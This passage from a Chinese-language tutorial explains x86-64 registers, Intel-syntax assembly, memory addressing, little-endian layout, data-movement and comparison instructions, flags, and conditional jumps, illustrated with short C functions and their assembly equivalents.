+</span></span></code></pre></div><p>需要注意，“变量存放在哪里”不是永远固定的。编译器可能把一个变量放在寄存器里，也可能放在栈上；开启优化后，一个没有实际用途的变量甚至可能被直接删除。逆向分析时，我们关注的是数据在当前指令中的真实位置，而不是源代码中的名字。</p><h2 id=x86-64-寄存器>x86-64 寄存器</h2><p>寄存器位于 CPU 内部。汇编代码经常直接读写寄存器，因此认识寄存器是阅读反汇编的第一步。</p><h3 id=1-通用寄存器>1. 通用寄存器</h3><p>x86-64 提供 16 个主要的 64 位通用寄存器：</p><table><thead><tr><th>寄存器</th><th>常见约定用途</th></tr></thead><tbody><tr><td><code>RAX</code></td><td>函数返回值，部分算术指令的隐含操作数</td></tr><tr><td><code>RBX</code></td><td>通用数据；在 System V 调用约定中由被调用者保存</td></tr><tr><td><code>RCX</code></td><td>通用数据、函数第 4 个整数参数、部分循环或字符串操作</td></tr><tr><td><code>RDX</code></td><td>通用数据、函数第 3 个整数参数、部分乘除法操作</td></tr><tr><td><code>RSI</code></td><td>通用数据、函数第 2 个整数参数</td></tr><tr><td><code>RDI</code></td><td>通用数据、函数第 1 个整数参数</td></tr><tr><td><code>RBP</code></td><td>可作为栈帧基址，也可以被编译器当作普通通用寄存器</td></tr><tr><td><code>RSP</code></td><td>栈顶指针</td></tr><tr><td><code>R8</code>～<code>R9</code></td><td>通用数据、函数第 5、6 个整数参数</td></tr><tr><td><code>R10</code>～<code>R11</code></td><td>通用数据，由调用者保存</td></tr><tr><td><code>R12</code>～<code>R15</code></td><td>通用数据，由被调用者保存</td></tr></tbody></table><p>表中的用途大多来自指令规则或调用约定，并不代表寄存器只能这样使用。例如，<code>RAX</code> 除了保存返回值，也完全可以用于普通加法。分析程序时，应先看指令如何使用它，再结合上下文判断含义。</p><h3 id=2-特殊寄存器>2. 特殊寄存器</h3><ul><li><strong><code>RIP</code></strong>：指令指针，表示下一条将要执行的指令位置。普通 <code>mov</code> 指令不能随意直接修改它；跳转、调用和返回等控制流指令会改变它。</li><li><strong><code>RSP</code></strong>：栈顶指针，保存当前栈顶地址。函数创建局部空间、保存数据或恢复现场时都会修改它。</li><li><strong><code>RBP</code></strong>：常用作栈帧基址，使函数能够通过固定偏移访问参数和局部变量；开启优化后经常被省略。</li><li><strong><code>RFLAGS</code></strong>：保存运算状态和部分控制标志。条件跳转主要读取其中的零标志、符号标志、进位标志和溢出标志。</li></ul><p>本文不展开浮点、SIMD、控制寄存器和内核态寄存器。这些内容在遇到相关程序时再学习即可。</p><h3 id=3-子寄存器>3. 子寄存器</h3><p>同一个寄存器可以用不同名称访问不同宽度。以 <code>RAX</code> 为例：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>63                                      0
+</span></span><span style=display:flex><span>+---------------------------------------+
+</span></span><span style=display:flex><span>|                  RAX                  | 64 位
+</span></span><span style=display:flex><span>+-------------------+-------------------+
+</span></span><span style=display:flex><span>                    |        EAX        | 32 位
+</span></span><span style=display:flex><span>                    +---------+---------+
+</span></span><span style=display:flex><span>                              |   AX    | 16 位
+</span></span><span style=display:flex><span>                              +----+----+
+</span></span><span style=display:flex><span>                              | AH | AL | 各 8 位
+</span></span><span style=display:flex><span>                              +----+----+
+</span></span></code></pre></div><p><code>RBX/EBX/BX/BL</code>、<code>RCX/ECX/CX/CL</code> 等名称也遵循类似规律。<code>R8</code> 到 <code>R15</code> 则使用 <code>R8D</code>、<code>R8W</code>、<code>R8B</code> 这样的后缀表示 32、16、8 位部分。</p><p>在 64 位模式下，有一条非常重要的规则：</p><blockquote><p>写入 32 位子寄存器会自动把对应 64 位寄存器的高 32 位清零；写入 8 位或 16 位子寄存器不会自动清除其余位。</p></blockquote><p>例如：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rax</span>, <span style=color:#a5d6ff>0xffffffffffffffff</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#a5d6ff>1</span>
+</span></span></code></pre></div><p>执行后，<code>RAX</code> 的值是 <code>0x0000000000000001</code>，而不是 <code>0xffffffff00000001</code>。理解这一点能够避免很多寄存器追踪错误。</p><h2 id=汇编语言的基本写法>汇编语言的基本写法</h2><h3 id=1-指令和操作数>1. 指令和操作数</h3><p>一条汇编指令通常由“指令助记符 + 操作数”组成：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#a5d6ff>10</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ebx</span>
+</span></span></code></pre></div><p>本文使用 Intel 语法，基本格式是：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>指令 目标操作数, 源操作数
+</span></span></code></pre></div><p>因此 <code>mov eax, ebx</code> 表示把 <code>EBX</code> 的值复制到 <code>EAX</code>，不会反过来修改 <code>EBX</code>。</p><p>常见操作数包括：</p><ul><li><strong>立即数</strong>：直接写在指令中的常量，如 <code>10</code>、<code>0x20</code>。</li><li><strong>寄存器操作数</strong>：数据位于寄存器中，如 <code>rax</code>。</li><li><strong>内存操作数</strong>：方括号内给出要访问的内存地址，如 <code>[rbx]</code>、<code>[rbp-8]</code>。</li></ul><p>例如：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#a5d6ff>10</span>          <span style=color:#8b949e;font-style:italic>; EAX = 10
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>ebx</span>, <span style=color:#79c0ff;font-weight:700>eax</span>         <span style=color:#8b949e;font-style:italic>; EBX = EAX
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span>]       <span style=color:#8b949e;font-style:italic>; 从 RDI 指向的内存读取 4 字节到 ECX
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> [<span style=color:#79c0ff;font-weight:700>rsi</span> <span style=color:#f85149>+</span> <span style=color:#a5d6ff>4</span>], <span style=color:#79c0ff;font-weight:700>ecx</span>   <span style=color:#8b949e;font-style:italic>; 把 ECX 的 4 字节写入 RSI+4 指向的内存
+</span></span></span></code></pre></div><p>寄存器宽度通常暗示访问的数据大小：<code>AL</code> 是 1 字节，<code>AX</code> 是 2 字节，<code>EAX</code> 是 4 字节，<code>RAX</code> 是 8 字节。某些场景需要显式写出 <code>byte ptr</code>、<code>dword ptr</code> 或 <code>qword ptr</code>，以免数据宽度产生歧义。</p><p>x86 的普通 <code>mov</code> 通常不能同时把源和目标都写成内存操作数。若要把一处内存的数据复制到另一处，一般先经过寄存器：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span>]
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> [<span style=color:#79c0ff;font-weight:700>rsi</span>], <span style=color:#79c0ff;font-weight:700>eax</span>
+</span></span></code></pre></div><h3 id=2-内存寻址>2. 内存寻址</h3><p>x86-64 常见的内存地址形式可以写成：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>[基址寄存器 + 索引寄存器 * 比例 + 偏移]
+</span></span></code></pre></div><p>其中比例只能是 <code>1</code>、<code>2</code>、<code>4</code> 或 <code>8</code>。例如，一个 <code>int</code> 占 4 字节，读取数组的第 <code>i</code> 个元素可能写成：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#79c0ff;font-weight:700>rsi</span>*<span style=color:#a5d6ff>4</span>]
+</span></span></code></pre></div><p>若 <code>RDI</code> 保存数组首地址、<code>RSI</code> 保存下标 <code>i</code>，这条指令就近似对应：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>eax <span style=color:#ff7b72;font-weight:700>=</span> ((<span style=color:#ff7b72>int</span> <span style=color:#ff7b72;font-weight:700>*</span>)rdi)[rsi];
+</span></span></code></pre></div><p>方括号表示“访问该地址处的内存”。没有方括号时，操作的是地址值或寄存器值本身。</p><h3 id=3-数据宽度与小端序>3. 数据宽度与小端序</h3><p>内存可以看成一串按地址编号的字节。一个地址通常对应一个字节，而 <code>int</code>、指针等数据会连续占用多个字节。x86-64 使用<strong>小端序</strong>保存多字节整数，也就是把数值的低位字节放在较低的内存地址。</p><p>假设从地址 <code>0x1000</code> 开始保存 32 位数值 <code>0x11223344</code>，内存布局是：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>地址      内容
+</span></span><span style=display:flex><span>0x1000    44
+</span></span><span style=display:flex><span>0x1001    33
+</span></span><span style=display:flex><span>0x1002    22
+</span></span><span style=display:flex><span>0x1003    11
+</span></span></code></pre></div><p>这并不表示数值被反转了，只是规定了各字节在内存中的排列顺序。CPU 用 32 位宽度读取 <code>0x1000</code> 时，得到的仍是 <code>0x11223344</code>。但在调试器或十六进制编辑器中逐字节观察时，通常会先看到 <code>44 33 22 11</code>。</p><p>数据宽度同样重要。若 <code>RDI = 0x1000</code>：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>al</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span>]       <span style=color:#8b949e;font-style:italic>; 读取 1 字节，得到 0x44
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>ax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span>]       <span style=color:#8b949e;font-style:italic>; 读取 2 字节，得到 0x3344
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span>]      <span style=color:#8b949e;font-style:italic>; 读取 4 字节，得到 0x11223344
+</span></span></span></code></pre></div><p>逆向分析时，同一个地址可能被按不同宽度访问。访问宽度有助于推测数据类型和结构布局，也是判断缓冲区边界是否正确的重要依据。</p><h2 id=常见的数据传输指令>常见的数据传输指令</h2><h3 id=1-mov复制数据>1. <code>mov</code>：复制数据</h3><p><code>mov</code> 是最常见的数据传输指令：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rax</span>, <span style=color:#79c0ff;font-weight:700>rbx</span>        <span style=color:#8b949e;font-style:italic>; RAX = RBX
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span>]      <span style=color:#8b949e;font-style:italic>; 从内存读取 4 字节
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> [<span style=color:#79c0ff;font-weight:700>rdi</span>], <span style=color:#79c0ff;font-weight:700>eax</span>      <span style=color:#8b949e;font-style:italic>; 向内存写入 4 字节
+</span></span></span></code></pre></div><p>它是“复制”而不是“移动后清空”。执行 <code>mov rax, rbx</code> 后，<code>RBX</code> 保持不变。</p><h3 id=2-movzx-与-movsx扩展较小的数据>2. <code>movzx</code> 与 <code>movsx</code>：扩展较小的数据</h3><p>把 8 位或 16 位数据放入更宽的寄存器时，需要决定高位如何填写：</p><ul><li><code>movzx</code>：零扩展，高位补 <code>0</code>，适合无符号数。</li><li><code>movsx</code>：符号扩展，根据源数据的最高位填充高位，适合有符号数。</li></ul><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>al</span>, <span style=color:#a5d6ff>0xff</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>movzx</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#79c0ff;font-weight:700>al</span>       <span style=color:#8b949e;font-style:italic>; ECX = 255
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>movsx</span> <span style=color:#79c0ff;font-weight:700>edx</span>, <span style=color:#79c0ff;font-weight:700>al</span>       <span style=color:#8b949e;font-style:italic>; EDX = 0xffffffff，即有符号数 -1
+</span></span></span></code></pre></div><p>相同的位模式 <code>0xff</code> 可以表示无符号数 255，也可以表示 8 位有符号数 -1。CPU 不会给寄存器贴上“有符号”或“无符号”标签，具体含义取决于后续使用的指令。</p><h3 id=3-lea计算有效地址>3. <code>lea</code>：计算有效地址</h3><p><code>lea</code> 的原意是“加载有效地址”。它计算方括号中的地址表达式，但不会读取该地址处的内存：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>lea</span> <span style=color:#79c0ff;font-weight:700>rax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#a5d6ff>8</span>]  <span style=color:#8b949e;font-style:italic>; RAX = RDI + 8
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>rax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#a5d6ff>8</span>]  <span style=color:#8b949e;font-style:italic>; RAX = 内存[RDI + 8]
+</span></span></span></code></pre></div><p>二者看起来相似，含义却完全不同。因为 <code>lea</code> 可以完成加法和有限倍率乘法，编译器也常把它用于普通算术：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>f</span>(<span style=color:#ff7b72>int</span> x) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> x <span style=color:#ff7b72;font-weight:700>*</span> <span style=color:#a5d6ff>5</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>3</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>一种可能的汇编实现是：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>f:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>lea</span> <span style=color:#79c0ff;font-weight:700>eax</span>, [<span style=color:#79c0ff;font-weight:700>rdi</span> <span style=color:#f85149>+</span> <span style=color:#79c0ff;font-weight:700>rdi</span>*<span style=color:#a5d6ff>4</span> <span style=color:#f85149>+</span> <span style=color:#a5d6ff>3</span>]
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><p>这里没有访问内存，只是计算 <code>x + x*4 + 3</code>。</p><h3 id=4-push-与-pop在栈上保存和取回数据>4. <code>push</code> 与 <code>pop</code>：在栈上保存和取回数据</h3><p>在 x86-64 中，可以把下面两条指令近似理解为：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>push</span> <span style=color:#79c0ff;font-weight:700>rax</span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>; 等价效果：RSP = RSP - 8；内存[RSP] = RAX
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>pop</span> <span style=color:#79c0ff;font-weight:700>rbx</span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic>; 等价效果：RBX = 内存[RSP]；RSP = RSP + 8
+</span></span></span></code></pre></div><p><code>push</code> 先降低 <code>RSP</code> 再写入，<code>pop</code> 先读取再提高 <code>RSP</code>。二者必须配合栈的布局来理解，后文会详细说明。</p><h2 id=运算比较与标志位>运算、比较与标志位</h2><h3 id=1-基本运算>1. 基本运算</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ebx</span>        <span style=color:#8b949e;font-style:italic>; EAX = EAX + EBX
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>sub</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#a5d6ff>4</span>          <span style=color:#8b949e;font-style:italic>; EAX = EAX - 4
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#d2a8ff;font-weight:700>xor</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>eax</span>        <span style=color:#8b949e;font-style:italic>; EAX = 0，同时清零 RAX 的高 32 位
+</span></span></span></code></pre></div><p><code>xor eax, eax</code> 常用于将寄存器清零。它并不神秘：任何值与自身逐位异或，结果都是 0。</p><h3 id=2-常见状态标志>2. 常见状态标志</h3><p>许多算术和逻辑指令会更新 <code>RFLAGS</code> 中的状态。阅读条件跳转时，最常见的是：</p><table><thead><tr><th>标志</th><th>名称</th><th>常见含义</th></tr></thead><tbody><tr><td><code>ZF</code></td><td>Zero Flag</td><td>结果是否为 0</td></tr><tr><td><code>SF</code></td><td>Sign Flag</td><td>结果最高位是否为 1</td></tr><tr><td><code>CF</code></td><td>Carry Flag</td><td>无符号运算是否产生进位或借位</td></tr><tr><td><code>OF</code></td><td>Overflow Flag</td><td>有符号运算是否溢出</td></tr></tbody></table><h3 id=3-cmp比较两个值>3. <code>cmp</code>：比较两个值</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>cmp</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ebx</span>
+</span></span></code></pre></div><p><code>cmp</code> 在内部按照 <code>EAX - EBX</code> 更新标志位，但不保存减法结果，也不会改变 <code>EAX</code> 和 <code>EBX</code>。紧随其后的条件跳转会读取这些标志。</p><p>有符号数和无符号数使用不同的条件跳转：</p><table><thead><tr><th>含义</th><th>有符号跳转</th><th>无符号跳转</th></tr></thead><tbody><tr><td>相等</td><td><code>je</code></td><td><code>je</code></td></tr><tr><td>不相等</td><td><code>jne</code></td><td><code>jne</code></td></tr><tr><td>大于</td><td><code>jg</code></td><td><code>ja</code></td></tr><tr><td>大于等于</td><td><code>jge</code></td><td><code>jae</code></td></tr><tr><td>小于</td><td><code>jl</code></td><td><code>jb</code></td></tr><tr><td>小于等于</td><td><code>jle</code></td><td><code>jbe</code></td></tr></tbody></table><p>这里的 <code>g/l</code> 可以理解为 signed greater/less，<code>a/b</code> 可以理解为 unsigned above/below。相同的位模式在有符号和无符号解释下大小关系可能完全不同，因此选择哪组跳转非常重要。</p><h3 id=4-test按位测试>4. <code>test</code>：按位测试</h3><p><code>test</code> 对两个操作数执行按位与，更新标志位，但不保存结果。最常见的用法是判断一个值是否为 0：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>test</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>eax</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>je</span> <span style=color:#79c0ff;font-weight:700>.is_zero</span>
+</span></span></code></pre></div><p>若 <code>EAX</code> 为 0，<code>EAX & EAX</code> 的结果也是 0，<code>ZF</code> 被置为 1，<code>je</code> 就会跳转。</p><h2 id=控制流指令>控制流指令</h2><p>程序默认按地址顺序执行。控制流指令可以改变下一条指令的位置，从而实现判断、循环和函数调用。</p><h3 id=1-jmp无条件跳转>1. <code>jmp</code>：无条件跳转</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>jmp</span> <span style=color:#79c0ff;font-weight:700>.done</span>
+</span></span></code></pre></div><p>执行后，无论标志位如何，都会从 <code>.done</code> 标签处继续。标签只是汇编代码中对地址的命名，生成机器码后通常会变成目标地址或相对偏移。</p><h3 id=2-条件跳转与-ifelse>2. 条件跳转与 <code>if/else</code></h3><p>下面的 C 函数返回两个有符号整数中的较大值：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>max_value</span>(<span style=color:#ff7b72>int</span> a, <span style=color:#ff7b72>int</span> b) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (a <span style=color:#ff7b72;font-weight:700>&gt;</span> b) {
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> a;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> b;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>一种直观的汇编写法是：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>max_value:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>cmp</span> <span style=color:#79c0ff;font-weight:700>edi</span>, <span style=color:#79c0ff;font-weight:700>esi</span>          <span style=color:#8b949e;font-style:italic>; 比较 a 和 b
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>jle</span> <span style=color:#79c0ff;font-weight:700>.use_b</span>            <span style=color:#8b949e;font-style:italic>; 如果 a &lt;= b，跳到 .use_b
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>edi</span>          <span style=color:#8b949e;font-style:italic>; 返回 a
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>.use_b:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>esi</span>          <span style=color:#8b949e;font-style:italic>; 返回 b
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><p>根据 System V AMD64 调用约定，前两个 <code>int</code> 参数位于 <code>EDI</code>、<code>ESI</code>，返回值写入 <code>EAX</code>。由于 <code>int</code> 是有符号类型，这里使用 <code>jle</code>，而不是用于无符号比较的 <code>jbe</code>。</p><h3 id=3-条件跳转与循环>3. 条件跳转与循环</h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>sum_to_n</span>(<span style=color:#ff7b72>int</span> n) {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>int</span> sum <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>1</span>; i <span style=color:#ff7b72;font-weight:700>&lt;=</span> n; i<span style=color:#ff7b72;font-weight:700>++</span>) {
+</span></span><span style=display:flex><span>        sum <span style=color:#ff7b72;font-weight:700>+=</span> i;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> sum;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>一种便于教学的汇编实现是：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>sum_to_n:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>xor</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>eax</span>          <span style=color:#8b949e;font-style:italic>; sum = 0
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>mov</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#a5d6ff>1</span>            <span style=color:#8b949e;font-style:italic>; i = 1
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span><span style=color:#79c0ff;font-weight:700>.loop:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>cmp</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#79c0ff;font-weight:700>edi</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>jg</span> <span style=color:#79c0ff;font-weight:700>.done</span>              <span style=color:#8b949e;font-style:italic>; i &gt; n 时结束
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>eax</span>, <span style=color:#79c0ff;font-weight:700>ecx</span>          <span style=color:#8b949e;font-style:italic>; sum += i
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>add</span> <span style=color:#79c0ff;font-weight:700>ecx</span>, <span style=color:#a5d6ff>1</span>            <span style=color:#8b949e;font-style:italic>; i++
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>    <span style=color:#d2a8ff;font-weight:700>jmp</span> <span style=color:#79c0ff;font-weight:700>.loop</span>
+</span></span><span style=display:flex><span><span style=color:#79c0ff;font-weight:700>.done:</span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>ret</span>
